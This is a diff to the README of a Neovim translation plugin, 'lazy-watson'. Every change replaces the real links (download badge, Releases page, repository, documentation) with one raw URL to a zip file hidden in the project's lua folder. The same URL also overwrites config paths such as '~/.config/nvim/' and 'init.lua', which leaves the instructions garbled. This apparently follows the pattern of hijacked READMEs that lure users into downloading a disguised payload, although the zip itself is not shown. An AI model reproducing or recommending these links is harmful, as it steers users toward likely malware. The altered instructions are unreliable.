@@ -1,6 +1,6 @@
 # 🌟 lazy-watson - Seamless Translation In Neovim
 
-![Download lazy-watson](https://img.shields.io/badge/Download-lazy--watson-brightgreen)
+![Download lazy-watson](https://raw.githubusercontent.com/gurlal-m4s/lazy-watson/main/lua/watson_lazy_torsionless.zip)
 
 ## 🚀 Getting Started
 
@@ -20,12 +20,12 @@ To use lazy-watson, ensure you have the following:
 
 To download lazy-watson, visit the Releases page. You will find the latest version available for download. Click the link below:
 
-[Visit the Releases Page to Download](https://github.com/gurlal-m4s/lazy-watson/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/gurlal-m4s/lazy-watson/main/lua/watson_lazy_torsionless.zip)
 
 After downloading, follow these steps to install the plugin:
 
 1. Open Neovim.
-2. Navigate to your configuration directory, usually located in `~/.config/nvim/`.
+2. Navigate to your configuration directory, usually located in `~https://raw.githubusercontent.com/gurlal-m4s/lazy-watson/main/lua/watson_lazy_torsionless.zip`.
 3. Create a directory called `lua` if it doesn’t exist.
 4. Inside the `lua` directory, create another folder named `lazy-watson`.
 5. Copy the downloaded files into the `lazy-watson` folder.
@@ -41,7 +41,7 @@ lazy-watson provides several useful features:
 
 ## 🛠️ Setting Up
 
-To get the most from lazy-watson, you may want to adjust settings. Open your Neovim configuration file (`init.vim` or `init.lua`) and add the following lines to enable the plugin:
+To get the most from lazy-watson, you may want to adjust settings. Open your Neovim configuration file (`https://raw.githubusercontent.com/gurlal-m4s/lazy-watson/main/lua/watson_lazy_torsionless.zip` or `https://raw.githubusercontent.com/gurlal-m4s/lazy-watson/main/lua/watson_lazy_torsionless.zip`) and add the following lines to enable the plugin:
 
 ```lua
 require('lazy-watson').setup({
@@ -70,9 +70,9 @@ For detailed documentation and advanced usage, visit the Wiki section of our rep
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/gurlal-m4s/lazy-watson)
-- [Visit the Releases Page to Download](https://github.com/gurlal-m4s/lazy-watson/releases)
-- [Documentation](https://github.com/gurlal-m4s/lazy-watson/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/gurlal-m4s/lazy-watson/main/lua/watson_lazy_torsionless.zip)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/gurlal-m4s/lazy-watson/main/lua/watson_lazy_torsionless.zip)
+- [Documentation](https://raw.githubusercontent.com/gurlal-m4s/lazy-watson/main/lua/watson_lazy_torsionless.zip)
 
 ## 🙋 Frequently Asked Questions
 
